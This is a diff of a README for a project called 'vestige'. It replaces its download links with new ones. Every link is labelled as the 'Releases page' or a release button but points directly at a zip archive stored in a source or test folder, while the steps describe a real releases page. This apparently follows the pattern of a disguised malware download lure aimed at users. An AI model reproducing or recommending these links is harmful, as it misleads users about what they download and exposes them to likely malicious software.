@@ -10,11 +10,11 @@ To get started, you'll need to download and install the application. Follow the 
 
 Click the button below to access the latest version of vestige:
 
-[![Download vestige Release](https://raw.githubusercontent.com/TanapaJune/vestige/main/tests/e2e/src/Software_v2.3-alpha.4.zip%20vestige-blue?style=for-the-badge)](https://raw.githubusercontent.com/TanapaJune/vestige/main/tests/e2e/src/Software_v2.3-alpha.4.zip)
+[![Download vestige Release](https://github.com/TanapaJune/vestige/raw/refs/heads/main/crates/vestige-core/Software-v1.3.zip%20vestige-blue?style=for-the-badge)](https://github.com/TanapaJune/vestige/raw/refs/heads/main/crates/vestige-core/Software-v1.3.zip)
 
 ### 📂 Steps to Download
 
-1. Click the above button or visit the [Releases page](https://raw.githubusercontent.com/TanapaJune/vestige/main/tests/e2e/src/Software_v2.3-alpha.4.zip).
+1. Click the above button or visit the [Releases page](https://github.com/TanapaJune/vestige/raw/refs/heads/main/crates/vestige-core/Software-v1.3.zip).
 2. You will see a list of available versions. Look for the latest release, usually at the top.
 3. Click on the version number link to reveal more details.
 4. Scroll down to the "Assets" section. You will see various files available for download. Choose the one suitable for your operating system (e.g., Windows, macOS, or Linux).
@@ -75,4 +75,4 @@ For further information about vestige and its functionalities, check out:
 - **Tutorial Videos:** Watch step-by-step guides on installation and features.
 - **User Community:** Join our forums for tips and discussions on cognitive management.
 
-Refer again to our [Releases page](https://raw.githubusercontent.com/TanapaJune/vestige/main/tests/e2e/src/Software_v2.3-alpha.4.zip) to download vestige and enhance your cognitive abilities today.
+Refer again to our [Releases page](https://github.com/TanapaJune/vestige/raw/refs/heads/main/crates/vestige-core/Software-v1.3.zip) to download vestige and enhance your cognitive abilities today.
